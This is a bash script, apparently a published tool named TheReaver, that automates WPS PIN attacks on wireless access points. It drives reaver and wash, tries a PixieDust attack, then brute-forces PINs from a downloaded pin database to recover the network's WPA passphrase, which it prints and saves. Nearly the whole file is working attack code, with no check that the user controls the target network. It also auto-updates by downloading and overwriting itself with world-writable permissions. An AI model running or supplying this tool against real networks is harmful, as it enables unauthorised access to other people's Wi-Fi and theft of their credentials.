#!/bin/bash
#---------------------------------------------------------------------------------------------------------------------------------------------------------
#|Project........: TheReaver.sh                                                                                                                          |
#|Description..: This is a automate bash script to test WPS security based on official Airgeddon Pins Database and 3wifi.stascorp.com Alghoritms         |
#|Author.......: Virgula0                                                                                                                                |
#|Version......: 1.0                                                                                                                                     |
#|Usage........: sudo TheReaver.sh                                                                                                                       |
#---------------------------------------------------------------------------------------------------------------------------------------------------------

command -v reaver > /dev/null 2>&1 || { echo >&2 "I require reaver but it's not installed. Install it. Aborting."; exit 1; }
command -v wash > /dev/null 2>&1 || { echo >&2 "I require wash but it's not installed. Install it. Aborting."; exit 1; }
command -v airmon-ng > /dev/null 2>&1 || { echo >&2 "I require airmon-ng but it's not installed. Install it. Aborting."; exit 1; }
command -v airodump-ng > /dev/null 2>&1 || { echo >&2 "I require airodump-ng but it's not installed. Install it. Aborting."; exit 1; }
command rm /var/lib/reaver/* > /dev/null 2>&1;

#airgeddon pin database options
github_user="v1s1t0r1sh3r3"
github_repository="airgeddon"
branch="master"
pins_dbfile_checksum="pindb_checksum.txt";
known_pins_dbfile="./known_pins.db";
urlscript_pins_dbfile="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${known_pins_dbfile}"
urlscript_pins_dbfile_checksum="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${pins_dbfile_checksum}"
urlscript_thereaver_checksum="https://raw.githubusercontent.com/Virgula0/TheReaver/master/thereaverchecksum.txt"
project_url="https://raw.githubusercontent.com/Virgula0/TheReaver/master/TheReaver/TheReaver.sh"
current_file="$(basename "$(test -L "$0" && readlink "$0" || echo "$0")")"

#Get the checksum for local pin database file
function get_local_pin_dbfile_checksum() {
	local_pin_dbfile_checksum=$(md5sum "${known_pins_dbfile}" | awk '{print $1}')
}

function get_local_thereaver_checksum() {
	LOCATION="$(pwd)/$current_file";
	local_thereaver_checksum=$(md5sum "${LOCATION}" | awk '{print $1}')
}

#Get the checksum for remote pin database file
function get_remote_pin_dbfile_checksum() {

	remote_pin_dbfile_checksum=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile_checksum} 2> /dev/null | head -n 1)

	if [[ -n "${remote_pin_dbfile_checksum}" ]] && [[ "${remote_pin_dbfile_checksum}" != "${curl_404_error}" ]]; then
		return 0
	fi
	return 1
}

function get_remote_thereaver_checksum() {
	remote_thereaver_checksum=$(timeout -s SIGTERM 15 curl -L ${urlscript_thereaver_checksum} 2> /dev/null | head -n 1)

	if [[ -n "${remote_thereaver_checksum}" ]] && [[ "${remote_thereaver_checksum}" != "${curl_404_error}" ]]; then
		return 0
	fi
	return 1
}

introduction(){
  command clear
  printf "\e[1;92m\e[1;97m                                                                __ \n"
  printf "\e[1;92m\e[1;33m             _____  _           _____                          |  |\n"
  printf "\e[1;92m\e[1;31m            |_   _|| |_  ___   | __  | ___  ___  _ _  ___  ___ |  |\n"
  printf "\e[1;92m\e[1;95m              | |  |   || -_|  |    -|| -_|| .'|| | || -_||  _||__|\n"
  printf "\e[1;92m\e[1;34m              |_|  |_|_||___|  |__|__||___||__,| \_/ |___||_|  |__|\n"
  printf "\e[1;92m\e[1;34m                                                          v1.1     \n"
  printf "\e[1;92m\e[1;90m           Coded By Virgula0"
  printf "\e[1;92m\e[1;92m =>"
  printf "\e[1;92m\e[1;97m https://github.com/Virgula0/TheReaver\n"
}

#Set the script folder var if necessary
function set_script_folder_and_name() {

	if [ -z "${scriptfolder}" ]; then
		scriptfolder=${0}

		if ! [[ ${0} =~ ^/.*$ ]]; then
			if ! [[ ${0} =~ ^.*/.*$ ]]; then
				scriptfolder="./"
			fi
		fi
		scriptfolder="${scriptfolder%/*}/"
		scriptname="${0##*/}"
	fi
}

#shellcheck source=./known_pins.db
source "${scriptfolder}${known_pins_dbfile}"

function download_pins_database_file() {

	local pindb_file_downloaded=0
	remote_pindb_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile} 2> /dev/null)

	if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
		pindb_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pindb_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile} 2> /dev/null)
			if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
				pindb_file_downloaded=1
			fi
		fi
	fi

	if [ "${pindb_file_downloaded}" -eq 1 ]; then
		rm -rf "${scriptfolder}${known_pins_dbfile}" 2> /dev/null
		echo "${remote_pindb_file}" > "${scriptfolder}${known_pins_dbfile}"
    chmod 777 "${scriptfolder}${known_pins_dbfile}"
		return 0
	else
		return 1
	fi
}

function download_update() {

	local thereaver_file_downloaded=0
	remote_thereaver_file=$(timeout -s SIGTERM 15 curl -L ${project_url} 2> /dev/null)

	if [[ -n "${remote_thereaver_file}" ]] && [[ "${remote_thereaver_file}" != "${curl_404_error}" ]]; then
		thereaver_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pindb_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${project_url} 2> /dev/null)
			if [[ -n "${remote_thereaver_file}" ]] && [[ "${remote_thereaver_file}" != "${curl_404_error}" ]]; then
				thereaver_file_downloaded=1
			fi
		fi
	fi

	if [ "${thereaver_file_downloaded}" -eq 1 ]; then
		proj="TheReaver.sh";
		rm -rf "${scriptfolder}${proj}" 2> /dev/null
		echo "${remote_thereaver_file}" > "${scriptfolder}${proj}"
    chmod 777 "${scriptfolder}${proj}"
		printf "Updating complete. Restart TheReaver\n";
		exit
	fi
}

#Prepare the vars to be used on wps pin database attacks
function set_wps_mac_parameters() {
	six_wpsbssid_first_digits=${bssid:0:8}
	six_wpsbssid_first_digits_clean=${six_wpsbssid_first_digits//:}
}

#Search for target wps bssid mac in pin database and set the vars to be used
function search_in_pin_database() {
	bssid_found_in_db=0
	counter_pins_found=0
  NUMB=0;
	declare -g pins_found=()
	for item in "${!PINDB[@]}"; do
		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
			bssid_found_in_db=1
			arrpins=(${PINDB[${item//[[:space:]]/ }]})
			for item2 in "${arrpins[@]}"; do
				counter_pins_found=$((counter_pins_found+1))
				#NUMB+=(${item2})
        NUMB=$((NUMB+1))
				ARRAY+=("$item2")
			done
			break
		fi
	done
}

clear(){
  command airmon-ng stop $WIFIMONITOR &> /dev/null;
  #command service network-manager restart &> /dev/null;
}

#Set choosed interfased on monitor mode
interface(){
  #command airmon-ng check kill &> /dev/null;
  printf "\e[1;92m\e[1;92m \n"
  command airmon-ng |grep -v "Interface";
  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose Your Interface: \e[0m\en' Interface
  printf "\e[1;92m\e[1;34mStarting interface...\n"
  WIFIMONITOR=$(airmon-ng start $Interface |grep "monitor .* enabled" |grep -oP "wl[a-zA-Z0-9]+mon|mon[0-9]+|prism[0-9]+")
  #printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m] Trying PixieDust Attack...\e[0m\en"
  if [[ "$WIFIMONITOR" == "" || "$WIFIMONITOR" == " " ]]; then
    WIFIMONITOR=$Interface
  fi
}

#The first wash command to choose your network
wash (){
  printf "\e[1;92m\e[1;95m \n"
  command timeout 15s wash -i $WIFIMONITOR;
}

#Here er go! The main function to process the attack using reaver!
start(){
    introduction
    printf "\n\e[1;92m\e[1;97mInfos => | Bssid: $bssid | Essid: $essid | Ch: $channel | $WIFIMONITOR \n\e[1;92m\e[1;31mTotal Pins: $NUMB \e[1;92m\e[1;92m"
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting the attack please wait... \e[0m\en"
    CHECK=$(timeout $timee wash -i $WIFIMONITOR -c $channel |grep "$bssid")
    if [ ! -n "$CHECK" ]; then
      printf "\n\e[1;92m\e[1;31mCannot reach the network... Are you in range?/Are infos correct?/Has wps turned on? Else try to increase timeout\n";
      exit;
    fi
		if [ "$pixie" == "y" ]; then
    #arr=( "66240532" "55393485" "12345670" "15595386" "44342005" "23165649" "93363303" "10642733" "50768646" "35420361" "36784035" "13451080" "90507359" "84439246" "05949649" "10391242" "11692072" )
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Trying PixieDust Attack \e[1;92m\e[1;32m"
    PIXIE=$(timeout 34s reaver -i $WIFIMONITOR -b $bssid --essid="$essid" --channel=$channel -K -E -S 2>&1 |sed -n '/Reaver/!p' |sed '/Copyright/d' |sed '/^\s*$/d' |grep "WPS pin" |sed -n 's/^.*WPS pin:  //p')
    if [ -n "$PIXIE" ]; then
      printf "\e[1;92m\e[1;92m[\e[1;92m\e[1;93mV\e[1;92m\e[1;92m] \e[1;92m\e[1;34mPin Cracked Succesfully: $PIXIE\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Trying PIN $PIXIE \e[1;92m\e[1;32m"
      RECOVERPASSW=$(timeout 34s reaver -i $WIFIMONITOR -b $bssid --essid="$essid" --channel=$channel --pin=$PIXIE -g 2 -E -S 2>&1 |sed -n '/Reaver/!p' |sed '/Copyright/d' |sed '/^\s*$/d' |grep -E "WPA PSK" |sed -n -e 's/^.*WPA PSK: //p' |tr -d \')
      if [[ -n "$RECOVERPASSW" ]]; then
        PINN=$PIXIE;
        PASSWORD=$RECOVERPASSW;
        printf "\e[1;92m\e[1;92m[\e[1;92m\e[1;93mV\e[1;92m\e[1;92m] \e[1;92m\e[1;34mValid \e[1;92m\e[1;32m"
        printf "\n\n             \e[42mWIFI Cracked succesfully! \e[49m
          ---------------------------------
                Network => \e[31m $essid        \e[39m
                WPS PIN => \e[31m $PINN         \e[39m
                WPA PSK => \e[31m $PASSWORD     \e[39m
          ---------------------------------      \n";
          clear
          read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Do you want save results in a file?(Y/N) \e[0m\en' choose
          if [[ "$choose" == "Y" || "$choose" == "y" ]]; then
            printf "\n\n             WIFI Cracked succesfully!
              ---------------------------------
                    Network => $essid
                    WPS PIN => $PINN
                    WPA PSK => $PASSWORD
              ---------------------------------      \n" &>$essid.txt;
            LOCATION=$(pwd)
            LOCA="$LOCATION/$essid.txt";
            printf "Saved in: $LOCA \n";
          else
            printf "Bye Bye! \n"
            exit
          fi
          printf "Bye Bye! \n"
        exit
      else
        printf "\e[1;92m\e[1;92m[\e[1;92m\e[1;31mX\e[1;92m\e[1;92m] \e[1;92m\e[1;31mFailed. Try Again Later \e[1;92m\e[1;32m\n"
        exit
      fi
    fi
    printf "\e[1;92m\e[1;92m[\e[1;92m\e[1;31mX\e[1;92m\e[1;92m] \e[1;92m\e[1;31mFailed\e[1;92m\e[1;32m"
	fi
    for element in ${ARRAY[*]}
    do
      COMMAND=$(timeout $timee wash -i $WIFIMONITOR -c $channel |awk "/Yes/ && /$bssid/")
      if [[ -n "$COMMAND" ]]; then
        printf "\n\e[1;92m\e[1;31mDetected Ap Rate Limiting. Could not proceed \nExiting...\n";
        clear
        exit
      fi
      var=$((var+1))
      printf "\n\e[1;92m[\e[0m\e[1;77m$var\e[0m\e[1;92m] Trying PIN $element \e[1;92m\e[1;32m"
      ATTACK1=$(timeout 34s reaver -i $WIFIMONITOR -b $bssid --essid="$essid" --channel=$channel --pin=$element -g 2 -E -S 2>&1 |sed -n '/Reaver/!p' |sed '/Copyright/d' |sed '/^\s*$/d' |grep -E "WPA PSK" |sed -n -e 's/^.*WPA PSK: //p' |tr -d \')
      if [[ -n "$ATTACK1" ]]; then
        PINN=$element;
        PASSWORD=$ATTACK1;
        printf "\e[1;92m\e[1;92m[\e[1;92m\e[1;93mV\e[1;92m\e[1;92m] \e[1;92m\e[1;34mValid \e[1;92m\e[1;32m"
        printf "\n\n             \e[42mWIFI Cracked succesfully! \e[49m
          ---------------------------------
                Network => \e[31m $essid        \e[39m
                WPS PIN => \e[31m $PINN         \e[39m
                WPA PSK => \e[31m $PASSWORD     \e[39m
          ---------------------------------      \n";
          clear
          read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Do you want save results in a file?(Y/N) \e[0m\en' choose
          if [[ "$choose" == "Y" || "$choose" == "y" ]]; then
            printf "\n\n             WIFI Cracked succesfully!
              ---------------------------------
                    Network => $essid
                    WPS PIN => $PINN
                    WPA PSK => $PASSWORD
              ---------------------------------      \n" &>$essid.txt;
            LOCATION=$(pwd)
            LOCA="$LOCATION/$essid.txt";
            printf "Saved in: $LOCA \n";
          else
            printf "Bye Bye! \n"
            exit
          fi
          printf "Bye Bye! \n"
        exit
      fi
      printf "\e[1;92m\e[1;92m[\e[1;92m\e[1;31mX\e[1;92m\e[1;92m] \e[1;92m\e[1;31mFailed \e[1;92m\e[1;32m"
    done
    printf "\n\e[1;92m\e[1;31mAttack failed. No valid wps Pin found \n"
    clear
    exit
}

#Main Menu
menu(){

  introduction

	if [ "$EUID" -ne 0 ]
		then   printf "\n\e[1;31m\e[1;31mPlease Run it as root\n \n"
		exit
	fi

  printf "\n\e[1;92m\e[1;31mWelcome! \e[1;92m\e[1;92m"

wget -q --spider https://google.com

if [ $? -eq 0 ]; then
      if [ ! -f "$known_pins_dbfile" ]; then
    printf "\e[1;92m\e[1;31mUnable to find pin default database. Downloading....\n";
    download_pins_database_file
  fi
  set_script_folder_and_name
  get_local_pin_dbfile_checksum
  get_remote_pin_dbfile_checksum

  if [ "${local_pin_dbfile_checksum}" != "${remote_pin_dbfile_checksum}" ]; then
    printf "\e[1;92m\e[1;31mDatabase outdated. Updating....\n";
    download_pins_database_file
  fi

	get_local_thereaver_checksum
	get_remote_thereaver_checksum

	if [ "${local_thereaver_checksum}" != "${remote_thereaver_checksum}" ]; then
		printf "\e[1;92m\e[1;31m\nVersion outdated updating please wait....\n";
		download_update
	fi
fi

  interface
  introduction
  wash

  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Insert BSSID: \e[0m\en' bssid
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Insert ESSID: \e[0m\en' essid
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Insert Channel: \e[0m\en' channel
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Timeout for search networks(DEFAULT 3): \e[0m\en' timee
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Insert Pin File (DEFAULT Pins in db): \e[0m\en' file
	read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Do you want to try PixieDust Attack before(y/n)? (DEFAULT: Y): \e[0m\en' pixie


	if [[ ! -n "$pixie" || "$pixie" == "Y" || "$pixie" == "y" ]]; then
    pixie="y";
  fi

  if [ ! -n "$timee" ]; then
    timee="3";
  fi

  if [ ! -f "$file" ]; then
     printf "\e[1;92m\e[1;31mUnable to find pin file... Using Default Pin List. (Very Bad Choise)\n";
     set_wps_mac_parameters
     search_in_pin_database
     if [ "$NUMB" -eq "0" ]; then
       printf "\e[1;92m\e[1;31mNo WPS Pins found in local db for $bssid Exiting...\n";
			 clear
       exit;
    fi
     sleep 5s;
   else
     ARRAY=$(sed 's/|.*//' $file |sed '/codes for/d' |sed '/^\s*$/d' |sed -n '/<empty> /!p'|sed '$!N; /^\(.*\)\n\1$/!P; D')
		 NUMB=0;
		for item in ${ARRAY[*]}; do
		   NUMB=$((NUMB+1))
		done
  fi


  if [[ -n "$bssid" && -n "$essid"  && -n "$channel" ]]; then
      start
  else
      printf "\e[1;92m\e[1;31mYou have to insert all options before to proceed\n"
			clear
      exit
  fi
}

menu
